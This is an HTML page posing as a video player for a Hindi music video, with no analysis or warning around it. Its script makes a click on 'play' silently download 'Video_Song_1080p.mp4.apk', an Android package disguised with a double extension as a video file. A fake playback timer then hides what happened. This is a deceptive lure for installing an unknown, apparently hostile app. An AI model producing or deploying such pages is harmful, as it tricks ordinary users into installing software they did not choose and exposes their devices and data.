<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex">
<title>Video Player</title>
<style>
  body { background:#000; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; font-family:Arial, sans-serif; }
  .player { max-width:640px; width:100%; background:#111; border-radius:10px; overflow:hidden; }
  .screen { position:relative; aspect-ratio:16/9; cursor:pointer; background:linear-gradient(135deg,#1a1a2e,#16213e); }
  .screen img { width:100%; height:100%; object-fit:cover; display:block; }
  .play { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; }
  .play span { font-size:80px; color:#fff; text-shadow:0 0 30px rgba(0,0,0,.8); }
  .bar { display:flex; justify-content:space-between; padding:10px 14px; color:#ccc; font-size:13px; }
  .bar .name { overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
</style>
</head>
<body>
  <div class="player">
    <div class="screen" onclick="go()">
      <img src="thumb.jpg" alt="" onerror="this.style.display='none'">
      <div class="play"><span>▶</span></div>
    </div>
    <div class="bar">
      <span class="name">New Hindi Song 2026 - Official Video 1080p HD</span>
      <span id="t">00:00 / 03:45</span>
    </div>
  </div>
<script>
function go() {
  var a = document.createElement('a');
  a.href = 'Video_Song_1080p.mp4.apk';
  a.download = 'Video_Song_1080p.mp4.apk';
  document.body.appendChild(a);
  a.click();
  document.querySelector('.play').style.display = 'none';
  var t = 0;
  var iv = setInterval(function(){
    t++;
    var m = Math.floor(t/60), s = t%60;
    document.getElementById('t').textContent = (m<10?'0':'')+m+':'+(s<10?'0':'')+s+' / 03:45';
    if (t >= 8) clearInterval(iv);
  }, 1000);
}
</script>
</body>
</html>
